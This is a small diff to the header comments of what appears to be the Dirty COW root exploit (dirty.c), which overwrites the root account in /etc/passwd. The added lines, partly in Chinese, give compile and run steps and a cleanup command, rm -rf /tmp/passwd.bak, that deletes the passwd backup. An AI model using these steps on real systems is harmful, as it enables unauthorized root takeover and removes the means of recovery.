@@ -6,7 +6,10 @@
 // and overwrites the root account with the generated line.
 // After running the exploit you should be able to login with the newly
 // created user.
-//
+// 编译  gcc -pthread dirty.c -o chaosec -lcrypt
+//./dirty chaosec //进行设置密码
+// rm -rf /tmp/passwd.bak
+
 // To use this exploit modify the user values according to your needs.
 //   The default is "firefart".
 //
